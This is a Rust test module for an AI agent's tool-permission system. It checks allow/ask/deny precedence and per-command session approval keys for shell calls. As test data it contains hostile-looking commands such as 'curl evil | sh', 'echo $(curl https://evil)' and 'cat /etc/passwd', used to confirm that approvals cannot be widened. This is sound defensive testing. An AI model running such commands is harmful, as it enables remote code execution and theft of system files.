        assert_eq!(policy, ToolPolicy::Ask);
    }

    #[test]
    fn test_resolve_policy_launch_override_specific_beats_wildcard() {
        let mut launch = HashMap::new();
        launch.insert("bash".to_string(), ToolPolicy::Deny);
        launch.insert("*".to_string(), ToolPolicy::Allow);
        let policy = resolve_policy(
            "bash",
            true,
            &launch,
            &HashMap::new(),
            &HashMap::new(),
            &HashMap::new(),
        );
        // Specific tool match checked before wildcard
        assert_eq!(policy, ToolPolicy::Deny);
    }

    #[test]
    fn test_resolve_policy_global_overrides_default() {
        let mut global = HashMap::new();
        global.insert("read_file".to_string(), ToolPolicy::Deny);
        let policy = resolve_policy(
            "read_file",
            true,
            &HashMap::new(),
            &HashMap::new(),
            &HashMap::new(),
            &global,
        );
        assert_eq!(policy, ToolPolicy::Deny);
    }

    #[test]
    fn test_resolve_policy_stage_deny() {
        let mut stage = HashMap::new();
        stage.insert("bash".to_string(), "deny".to_string());
        let policy = resolve_policy(
            "bash",
            true,
            &HashMap::new(),
            &stage,
            &HashMap::new(),
            &HashMap::new(),
        );
        assert_eq!(policy, ToolPolicy::Deny);
    }

    #[test]
    fn test_resolve_policy_stage_ask() {
        let mut stage = HashMap::new();
        stage.insert("read_file".to_string(), "ask".to_string());
        let policy = resolve_policy(
            "read_file",
            true,
            &HashMap::new(),
            &stage,
            &HashMap::new(),
            &HashMap::new(),
        );
        assert_eq!(policy, ToolPolicy::Ask);
    }

    #[test]
    fn test_resolve_policy_unknown_stage_string_defaults_to_ask() {
        let mut stage = HashMap::new();
        stage.insert("bash".to_string(), "unknown_policy".to_string());
        let policy = resolve_policy(
            "bash",
            true,
            &HashMap::new(),
            &stage,
            &HashMap::new(),
            &HashMap::new(),
        );
        assert_eq!(policy, ToolPolicy::Ask);
    }

    // ─── parse_policy_str ──────────────────────────────────────────────────

    #[test]
    fn test_parse_policy_str_values() {
        assert_eq!(parse_policy_str("allow"), ToolPolicy::Allow);
        assert_eq!(parse_policy_str("Allow"), ToolPolicy::Allow);
        assert_eq!(parse_policy_str("ALLOW"), ToolPolicy::Allow);
        assert_eq!(parse_policy_str("deny"), ToolPolicy::Deny);
        assert_eq!(parse_policy_str("Deny"), ToolPolicy::Deny);
        assert_eq!(parse_policy_str("ask"), ToolPolicy::Ask);
        assert_eq!(parse_policy_str("Ask"), ToolPolicy::Ask);
        assert_eq!(parse_policy_str("anything_else"), ToolPolicy::Ask);
        assert_eq!(parse_policy_str(""), ToolPolicy::Ask);
    }

    // ─── ToolRegistry construction ─────────────────────────────────────────

    #[tokio::test]
    async fn test_tool_registry_build_no_mcp() {
        let config = Config::default();
        let workdir = std::env::current_dir().unwrap();
        let registry = ToolRegistry::build(workdir, &config).await;

        // Should have built-in tools
        assert!(!registry.builtin_names.is_empty());
        // Should have no MCP tools
        assert!(registry.mcp_tool_defs.is_empty());
    }

    #[tokio::test]
    async fn test_tool_registry_all_tool_defs() {
        let config = Config::default();
        let workdir = std::env::current_dir().unwrap();
        let registry = ToolRegistry::build(workdir, &config).await;

        let all_defs = registry.all_tool_defs();
        assert!(!all_defs.is_empty());

        // Should include known built-in tools
        let names: Vec<&str> = all_defs.iter().map(|t| t.name.as_str()).collect();
        assert!(names.contains(&"read_file"));
    }

    #[tokio::test]
    async fn test_tool_registry_builtin_names_consistent() {
        let config = Config::default();
        let workdir = std::env::current_dir().unwrap();
        let registry = ToolRegistry::build(workdir, &config).await;

        // builtin_names should come from builtins.names()
        let names_from_builtins: HashSet<String> = registry.builtins.names().into_iter().collect();
        assert_eq!(registry.builtin_names, names_from_builtins);
    }

    // ─── resolve_policy full precedence chain ─────────────────────────────

    // ─── session_approval_keys ────────────────────────────────────────────

    fn shell_args(command: &str) -> serde_json::Value {
        serde_json::json!({ "command": command })
    }

    fn keys(command: &str) -> Vec<String> {
        session_approval_keys("shell", &shell_args(command))
    }

    /// The bug this replaces: one key for every shell call, so approving `ls`
    /// for the session approved `curl evil | sh` too.
    #[test]
    fn shell_approvals_are_keyed_on_the_command_prefix() {
        assert_eq!(keys("ls -la"), ["shell:ls"]);
        assert_eq!(keys("curl https://evil"), ["shell:curl https://evil"]);
        assert_ne!(keys("ls -la"), keys("curl https://evil"));
    }

    /// A subcommand narrows the grant: approving `git diff` must not also
    /// approve `git push`.
    #[test]
    fn a_subcommand_is_part_of_the_prefix() {
        assert_eq!(keys("git diff HEAD~1"), ["shell:git diff"]);
        assert_ne!(keys("git diff HEAD~1"), keys("git push --force"));
    }

    /// A flag does not narrow what the program is, so it is not part of the key -
    /// otherwise `ls -la` and `ls -l` would prompt separately for no benefit.
    #[test]
    fn flags_are_not_part_of_the_prefix() {
        assert_eq!(keys("cargo test --lib"), ["shell:cargo test"]);
        assert_eq!(keys("cargo test --lib"), keys("cargo test --doc"));
        assert_eq!(keys("ls -la"), keys("ls -l"));
    }

    /// A compound line grants one key per command in it. The first version
    /// refused these outright, and in a real run *every* shell call a coding
    /// agent made was compound - so "allow for this session" never once applied
    /// and the same work was re-approved over and over.
    #[test]
    fn a_compound_line_grants_each_command_in_it() {
        assert_eq!(keys("rm -rf __pycache__; ls -la"), ["shell:ls", "shell:rm"]);
        assert_eq!(
            keys(r#"test -f test.py && echo "created" || echo "missing""#),
            ["shell:echo", "shell:test"],
            "quoted data must not split one program into two grants"
        );
        assert_eq!(
            keys("python3 test.py | od -c | tail -5"),
            ["shell:od", "shell:python3 test.py", "shell:tail"]
        );
    }

    /// A quoted or variable-bearing argument is data, not a subcommand. Folding
    /// it into the key is what made the grant useless in practice: a run full of
    /// progress `echo`s re-prompted on every one.
    #[test]
    fn quoted_and_variable_arguments_are_not_part_of_the_key() {
        assert_eq!(keys(r#"echo "exit code: $?""#), ["shell:echo"]);
        assert_eq!(keys(r#"echo "done""#), keys(r#"echo "starting""#));
        // But a bare path still narrows: approving one script is not approving
        // every script.
        assert_eq!(keys("python3 test.py"), ["shell:python3 test.py"]);
        assert_ne!(keys("python3 test.py"), keys("python3 evil.py"));
    }

    /// The security property has to survive the split: a grant for one program
    /// must never cover a line that also runs an ungranted one. Keys are what
    /// the caller intersects, so this is stated as "not a subset".
    #[test]
    fn approving_one_program_does_not_cover_a_line_that_runs_another() {
        let granted: std::collections::HashSet<String> = keys("ls -la").into_iter().collect();
        let attempted = keys("ls && curl https://evil");
        assert!(
            !attempted.iter().all(|k| granted.contains(k)),
            "approving `ls` must not cover `ls && curl evil`: {attempted:?}"
        );
        // And the reason is that `curl` is its own key.
        assert!(attempted.iter().any(|k| k.starts_with("shell:curl")));
    }

    /// Command substitution runs a command *inside* another one, so it gets its
    /// own key. Otherwise `echo $(curl evil)` would grant only `echo`, and a
    /// later `echo $(curl evil)` would be covered by an earlier plain `echo`.
    #[test]
    fn a_substituted_command_gets_its_own_key() {
        let k = keys("echo $(curl https://evil)");
        assert!(k.iter().any(|k| k.starts_with("shell:curl")), "{k:?}");
        assert!(k.iter().any(|k| k == "shell:echo"), "{k:?}");
        // Nested substitution is lifted out too.
        let nested = keys("echo $(echo $(whoami))");
        assert!(nested.iter().any(|k| k == "shell:whoami"), "{nested:?}");
    }

    /// A redirect names a file, not a program - `> /tmp/out` must not become a
    /// key, and must not stop the command before it from being one.
    #[test]
    fn a_redirect_target_is_not_a_command() {
        assert_eq!(
            keys("cat /etc/passwd > /tmp/out"),
            ["shell:cat /etc/passwd"]
        );
    }

    /// Lines this cannot read as a list of commands are still refused outright:
    /// "approve once, ask again" is the safe direction when the shape is
    /// ambiguous.
    #[test]
    fn an_unreadable_line_is_not_session_grantable() {
        for command in [
            "echo `whoami`",     // backticks: nesting is ambiguous
            "echo $(unbalanced", // no closing paren
            "   ",               // no program at all
            "&& ||",             // separators only
        ] {
            assert!(
                keys(command).is_empty(),
                "{command:?} must not be session-grantable"
            );
        }
    }

    /// A segment with no program in it yields no key, which is what makes a
    /// separators-only line ungrantable rather than silently granting nothing.
    #[test]
    fn a_segment_with_no_program_has_no_prefix() {
        assert_eq!(command_prefix("   "), None);
        assert_eq!(command_prefix(""), None);
        assert_eq!(command_prefix("ls"), Some("ls".to_string()));
    }

    /// `bash` is an alias for `shell`, so it must get the same treatment rather
    /// than falling through to the by-name branch.
    #[test]
    fn the_bash_alias_is_scoped_like_shell() {
        assert_eq!(
            session_approval_keys("bash", &shell_args("ls -la")),
            ["shell:ls"]
        );
    }

    /// Non-shell tools keep keying on the tool name: their arguments do not
    /// widen what the tool can reach the way a command string does.
    #[test]
    fn other_tools_are_keyed_by_name() {
        assert_eq!(
            session_approval_keys("read_file", &serde_json::json!({ "path": "a" })),
            ["read_file"]
        );
    }

    /// A shell call with no `command` argument is malformed; it cannot be
    /// characterized, so it cannot be granted.
    #[test]
    fn a_shell_call_without_a_command_is_not_grantable() {
        assert!(session_approval_keys("shell", &serde_json::json!({})).is_empty());
    }

    /// A launch flag outranks a stage's `ask`, which is the point of `--allow`.
    #[test]
    fn test_resolve_policy_launch_overrides_stage_ask() {
        let mut launch = HashMap::new();
        launch.insert("bash".to_string(), ToolPolicy::Allow);
        let mut stage = HashMap::new();
        stage.insert("bash".to_string(), "ask".to_string());
        let policy = resolve_policy(
            "bash",
            true,
            &launch,
            &stage,
            &HashMap::new(),
            &HashMap::new(),
        );
        assert_eq!(policy, ToolPolicy::Allow);
    }

    /// It does not outrank a stage's `deny` - see
    /// `test_yolo_does_not_override_blueprint_deny` for the rationale.
    #[test]
    fn test_resolve_policy_launch_cannot_override_stage_deny() {
        let mut launch = HashMap::new();
        launch.insert("bash".to_string(), ToolPolicy::Allow);
        let mut stage = HashMap::new();
        stage.insert("bash".to_string(), "deny".to_string());
        let policy = resolve_policy(
            "bash",
            true,
            &launch,
            &stage,
            &HashMap::new(),
            &HashMap::new(),
        );
        assert_eq!(policy, ToolPolicy::Deny);
    }

    #[test]
    fn test_resolve_policy_stage_overrides_agent() {
        let mut stage = HashMap::new();
        stage.insert("bash".to_string(), "deny".to_string());
        let mut agent = HashMap::new();
        agent.insert("bash".to_string(), "allow".to_string());
        let policy = resolve_policy(
            "bash",
            true,
            &HashMap::new(),
            &stage,
            &agent,
            &HashMap::new(),
        );
        assert_eq!(policy, ToolPolicy::Deny);
    }

    #[test]
    fn test_resolve_policy_agent_overrides_global() {
        let mut agent = HashMap::new();
        agent.insert("write_file".to_string(), "deny".to_string());
        let mut global = HashMap::new();
        global.insert("write_file".to_string(), ToolPolicy::Allow);
        let policy = resolve_policy(
            "write_file",
            true,
            &HashMap::new(),
            &HashMap::new(),
            &agent,
            &global,
        );
        assert_eq!(policy, ToolPolicy::Deny);
    }

    #[test]
    fn test_resolve_policy_wildcard_launch_with_missing_specific() {
        let mut launch = HashMap::new();
        launch.insert("*".to_string(), ToolPolicy::Allow);
        // unknown_tool has no specific override, should match wildcard
        let policy = resolve_policy(
            "unknown_tool",
            false,
            &launch,
            &HashMap::new(),
            &HashMap::new(),
            &HashMap::new(),
        );
        assert_eq!(policy, ToolPolicy::Allow);
    }

    #[test]
    fn test_resolve_policy_mcp_tool_defaults_to_ask() {
        let policy = resolve_policy(
            "mcp_custom_tool",
            false,
            &HashMap::new(),
            &HashMap::new(),
            &HashMap::new(),
            &HashMap::new(),
        );
        assert_eq!(policy, ToolPolicy::Ask);
    }

    #[test]
    fn test_resolve_policy_read_file_default_is_allow() {
        let policy = resolve_policy(
            "read_file",
            true,
            &HashMap::new(),
            &HashMap::new(),
            &HashMap::new(),
            &HashMap::new(),
        );
        assert_eq!(policy, ToolPolicy::Allow);
    }

    #[test]
    fn test_resolve_policy_list_dir_default_is_allow() {
        let policy = resolve_policy(
            "list_dir",
            true,
            &HashMap::new(),
            &HashMap::new(),
            &HashMap::new(),
            &HashMap::new(),
        );
        assert_eq!(policy, ToolPolicy::Allow);
    }

    #[test]
    fn test_resolve_policy_write_file_default_is_ask() {
        let policy = resolve_policy(
            "write_file",
            true,
            &HashMap::new(),
            &HashMap::new(),
            &HashMap::new(),
            &HashMap::new(),
        );
        assert_eq!(policy, ToolPolicy::Ask);
    }

    #[test]
    fn test_resolve_policy_edit_file_default_is_ask() {
        let policy = resolve_policy(
            "edit_file",
            true,
            &HashMap::new(),
            &HashMap::new(),
            &HashMap::new(),
            &HashMap::new(),
        );
        assert_eq!(policy, ToolPolicy::Ask);
    }

    #[tokio::test]
    async fn test_tool_registry_shutdown_no_panic() {
        let config = Config::default();
        let workdir = std::env::current_dir().unwrap();
        let registry = ToolRegistry::build(workdir, &config).await;
        registry.shutdown().await;
    }

    #[tokio::test]
    async fn test_tool_registry_all_defs_includes_subagent() {
        let config = Config::default();
        let workdir = std::env::current_dir().unwrap();
        let registry = ToolRegistry::build(workdir, &config).await;
        let all_defs = registry.all_tool_defs();
        let names: Vec<&str> = all_defs.iter().map(|t| t.name.as_str()).collect();
        // Should include subagent tools
        assert!(names.contains(&"spawn_agent"));
    }

    // ─── default_tool_policy for all known builtin tools ──────────────────

    #[test]
    fn test_default_policy_search_is_ask() {
        assert_eq!(default_tool_policy("search", true), ToolPolicy::Ask);
    }

    #[test]
    fn test_default_policy_glob_is_ask() {
        assert_eq!(default_tool_policy("glob", true), ToolPolicy::Ask);
    }

    #[test]
    fn test_default_policy_http_request_is_ask() {
        assert_eq!(default_tool_policy("http_request", true), ToolPolicy::Ask);
    }

    #[test]
    fn test_default_policy_read_file_not_builtin_still_allow() {
        // Even if is_builtin is false, the name-based lookup should still match
        assert_eq!(default_tool_policy("read_file", false), ToolPolicy::Allow);
    }

    #[test]
    fn test_default_policy_list_dir_not_builtin_still_allow() {
        assert_eq!(default_tool_policy("list_dir", false), ToolPolicy::Allow);
    }

    // ─── resolve_policy: agent-level deny ─────────────────────────────────

    #[test]
    fn test_resolve_policy_agent_deny() {
        let mut agent = HashMap::new();
        agent.insert("read_file".to_string(), "deny".to_string());
        let policy = resolve_policy(
            "read_file",
            true,
            &HashMap::new(),
            &HashMap::new(),
            &agent,
            &HashMap::new(),
        );
        assert_eq!(policy, ToolPolicy::Deny);
    }

    // ─── resolve_policy: unknown agent-level string defaults to ask ───────

    #[test]
    fn test_resolve_policy_agent_unknown_string_defaults_to_ask() {
        let mut agent = HashMap::new();
        agent.insert("bash".to_string(), "foobar".to_string());
        let policy = resolve_policy(
            "bash",
            true,
            &HashMap::new(),
            &HashMap::new(),
            &agent,
            &HashMap::new(),
        );
        assert_eq!(policy, ToolPolicy::Ask);
    }

    // ─── resolve_policy: global allows override default ───────────────────

    #[test]
    fn test_resolve_policy_global_allow_overrides_default_ask() {
        let mut global = HashMap::new();
        global.insert("bash".to_string(), ToolPolicy::Allow);
        let policy = resolve_policy(
            "bash",
            true,
            &HashMap::new(),
            &HashMap::new(),
            &HashMap::new(),
            &global,
        );
        assert_eq!(policy, ToolPolicy::Allow);
    }

    #[tokio::test]
    async fn test_tool_registry_all_defs_includes_all_subagent_tools() {
        let config = Config::default();
        let workdir = std::env::current_dir().unwrap();
        let registry = ToolRegistry::build(workdir, &config).await;
        let all_defs = registry.all_tool_defs();
        let names: Vec<&str> = all_defs.iter().map(|t| t.name.as_str()).collect();

        for expected in &[
            "spawn_agent",
            "check_agent",
            "wait_for_agent",
            "send_to_agent",
            "kill_agent",
        ] {
            assert!(names.contains(expected));
        }
    }

    // ─── ToolRegistry.builtin_names includes known builtins ───────────────

    #[tokio::test]
    async fn test_tool_registry_builtin_names_has_expected_tools() {
        let config = Config::default();
        let workdir = std::env::current_dir().unwrap();
        let registry = ToolRegistry::build(workdir, &config).await;

        // These should be in builtin_names
        for name in &["read_file", "list_dir"] {
            assert!(registry.builtin_names.contains(*name));
        }

        // Subagent tools should NOT be in builtin_names
        assert!(!registry.builtin_names.contains("spawn_agent"));
    }

    // ─── ToolRegistry.all_tool_defs does not duplicate ────────────────────

    #[tokio::test]
    async fn test_tool_registry_all_defs_no_mcp_when_none_configured() {
        let config = Config::default();
        let workdir = std::env::current_dir().unwrap();
        let registry = ToolRegistry::build(workdir, &config).await;
        assert!(registry.mcp_tool_defs.is_empty());

        // Total defs = builtins + subagent tools
        let all_defs = registry.all_tool_defs();
        let builtin_count = registry.builtins.tool_defs().len();
        let subagent_count = leviath_tools::BuiltinTools::subagent_tool_defs().len();
        assert_eq!(all_defs.len(), builtin_count + subagent_count);
    }

    // ─── resolve_policy full chain: all four levels present ───────────────

    /// With every level saying `deny`, nothing lifts it - not the stage, not the
    /// agent, not `--allow`. Asserting `Allow` here would mean a launch flag
    /// beats a unanimous deny.
    #[test]
    fn test_resolve_policy_full_chain_deny_is_terminal() {
        let mut launch = HashMap::new();
        launch.insert("bash".to_string(), ToolPolicy::Allow);
        let mut stage = HashMap::new();
        stage.insert("bash".to_string(), "deny".to_string());
        let mut agent = HashMap::new();
        agent.insert("bash".to_string(), "deny".to_string());
        let mut global = HashMap::new();
        global.insert("bash".to_string(), ToolPolicy::Deny);

        let policy = resolve_policy("bash", true, &launch, &stage, &agent, &global);
        assert_eq!(policy, ToolPolicy::Deny);
    }

    /// The full chain with nothing denying: stage `ask` is the tightest
    /// configured level, and the launch flag relaxes it.
    #[test]
    fn test_resolve_policy_full_chain_launch_relaxes_ask() {
        let mut launch = HashMap::new();
        launch.insert("bash".to_string(), ToolPolicy::Allow);
        let mut stage = HashMap::new();
        stage.insert("bash".to_string(), "ask".to_string());
        let mut agent = HashMap::new();
        agent.insert("bash".to_string(), "ask".to_string());
        let mut global = HashMap::new();
        global.insert("bash".to_string(), ToolPolicy::Ask);

        let policy = resolve_policy("bash", true, &launch, &stage, &agent, &global);
        assert_eq!(policy, ToolPolicy::Allow);
    }

    // ─── ToolRegistry build with failing MCP server ────────────────────────
    // Exercises the Err branch (lines 52-58): a bad command fails to connect.

    #[tokio::test]
    async fn test_tool_registry_build_with_failing_mcp_server() {
        use leviath_mcp::MCPServerConfig;

        let bad_server = MCPServerConfig::stdio(
            "bad-server",
            "/nonexistent/binary/that/does/not/exist",
            vec![],
        );
        let config = Config {
            mcp_servers: vec![bad_server],
            ..Config::default()
        };

        let workdir = std::env::current_dir().unwrap();
        // Should not panic; the error branch is non-fatal (just a tracing::warn)
        let registry = ToolRegistry::build(workdir, &config).await;

        // MCP tool defs should be empty because connection failed
        assert!(registry.mcp_tool_defs.is_empty());
        // Built-ins should still be present
        assert!(!registry.builtin_names.is_empty());
    }

    // Register a blueprint, spawn a caller entity in the world, then call spawn.
    // Uses multi_thread flavor because exec_spawn internally calls blocking_write().
}
